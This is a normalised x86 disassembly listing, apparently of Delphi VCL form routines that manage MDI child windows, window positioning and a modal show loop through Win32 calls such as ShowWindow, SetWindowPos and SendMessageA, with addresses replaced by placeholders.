test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4598a0
jmp r-xdata
mov eax [ rw-data ]
call sub_47346c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455450
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_45c380
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_473460
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455494
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
call sub_46c9c8
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_47349c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455450
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_47346c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_455cac
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_473490
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455494
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_473460
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_470030
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_470030
jmp r-xdata
sub_471c91
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4759fc
call sub_403a34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_47346c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455450
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_473460
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455494
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_47349c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455450
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_47346c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472128
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_455cac
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_473490
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_455494
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_473460
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_470030
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_470030
jmp r-xdata
sub_47202d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4759fc
call sub_403a34
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_470d80
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4598a0
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_45c380
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472128
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
call sub_46c9c8
mov ebx eax
sub_472174
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_4721cc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47222a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_472238
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4033e8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_472264
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4759e8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4033e8
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_472404
jmp r-xdata
mov eax ebx
call sub_4724a0
mov dl 0x1
mov eax ebx
call sub_46fff0
jmp r-xdata
sub_472308
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_46f97c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_46f9c8
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_47236c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4723d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4033e8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4724a0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_472424
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_472492
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472499
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_470c7c
sub_4724bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_472784
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4542ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_47495c
xor edx edx
push ebp
push sub_472767
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_418e40
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_47398c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_46c878
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_472745
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_47240c
xor edx edx
push ebp
push sub_4726a4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47236c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_475768
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_45c380
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4726ab
mov eax [ ebp - 0x4 ]
call sub_472404
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4726ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47274f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_47398c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_47398c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_418dbc
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418f60
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_46c92c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_472794
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_472794
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_472804
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_472794
pop ecx
mov eax [ esi + 0x34 ]
call sub_467c28
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_467c38
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_472888
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45a698
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4033e8
sub_4728ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4033e8
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4728dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4728ac
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4728dc
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472958
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4728ac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4728ac
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4728dc
pop ecx
test al al
je r-xdata
sub_4729ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4033e8
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4729dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4729ac
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4729dc
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45903c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472a58
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4729ac
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4729ac
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4729dc
pop ecx
